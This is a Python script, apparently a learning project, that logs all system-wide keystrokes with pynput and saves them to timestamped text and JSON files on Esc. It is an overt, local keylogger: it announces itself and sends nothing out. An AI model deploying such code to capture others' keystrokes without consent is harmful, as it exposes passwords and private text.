from pynput import keyboard    # for keyboard event monitoring
import json                    # for structured keystroke logging in JSON format
from datetime import datetime
import threading               #for thread-safe operations on shared variables
import os                     #for directory operations (creating logs folder)

key_list=[]      # store detailed keystroke events with metadata (event type, key pressed)
key_pressed=False  # Flag to track if a key is currently being held down (True = held, False = released)
key_stroke=()      #accumulate keystroke characters for text file logging
key_lock=threading.Lock()     # for thread-safe access to shared variables (key_list, key_pressed, key_stroke)
                              # This prevents race conditions when callbacks run in separate listener thread

if not os.path.exists("logs"):
    os.makedirs("logs")


# Function to write formatted keystroke data to a text file
def update_text_file(keysstr):
    timestamp=datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename=f"logs/keystrokes_{timestamp}.txt"             # filename with timestamp to avoid overwriting previous logs
    with open(filename,"w+", encoding="utf-8") as f:        # UTF-8 encoding to support special characters
        f.write(keysstr)

# Function to write detailed keystroke metadata to JSON file
def update_json_file(key_list):
    timestamp=datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename=f"logs/keystrokes_{timestamp}.json"
    with open(filename,"w",encoding="utf-8") as f:
        json.dump(key_list,f,indent=2)             # Serialize key_list (list of dictionaries) to JSON with pretty-printing (indent=2 for readability)

# Helper function to extract readable key representation from pynput key object
def get_key_str(key):
    try:
        # Attempt to get the character representation of the key (printable characters like 'a', '1', etc.)
        if key.char:
            return key.char
        else:
            # Return key symbol name for keys that have names but no character (fallback)
            return key.keysym
    except AttributeError:
        # For special keys without .char attribute (Shift, Ctrl, Alt, etc.), convert to string representation
        return str(key)
    
# Callback function triggered when a keyboard key is pressed down
def on_press(key):
    global key_list, key_pressed           # Declare global variables to modify them inside this function
    key_str=get_key_str(key)               # Get readable string representation of the pressed key
    with key_lock:                   # Acquire thread lock to safely modify shared variables (prevents race conditions)
        if key_pressed==False:        # Check if this is the start of a new key press (key wasn't held before)
            key_list.append({"event":"key_pressed","key":key_str})
            key_pressed=True                        # Set flag to True to indicate key is now being held
        else:
            # If key_pressed is already True, this is a continuous hold (key held down for multiple callbacks)
            key_list.append({"event":"key_held","key":key_str})


# Callback function triggered when a keyboard key is released
def on_release(key):
    global key_list, key_pressed, key_stroke
    key_str=get_key_str(key)                  # readable string representation of the released key
    with key_lock:
        if key_pressed==True:                     # Check if a key was being held (should be True when releasing)
            key_pressed=False                     # Set flag to False since the key is now released
            key_list.append({"event":"key_released","key":key_str})
    
    # Append the key character to the key_stroke tuple 
    key_stroke+=key_str,
    # Convert the tuple of keystroke characters to string format for text file logging
    keysstr=str(key_stroke)
    
    # Check if the ESC key was pressed (keyboard.Key.esc is the special ESC key object)
    if key==keyboard.Key.esc:
        # Write all accumulated keystrokes to text file before exiting
        update_text_file(keysstr)
        # Write all keystroke events with metadata to JSON file before exiting
        update_json_file(key_list)
        # Return False to stop the listener (terminates logging session gracefully)
        return False

print("Keystrokes logging session started \n Press 'Esc' to stop logging.")
print("Keystrokes will be saved to logs/ folder with timestamped filenames.")    

# Create a keyboard listener that monitors all keyboard events
with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    # listener.join() blocks execution and keeps the listener running continuously
    # The listener runs in a background thread and calls on_press/on_release for each keyboard event
    # Execution stops when listener returns False (happens in on_release when ESC is pressed)
    listener.join()




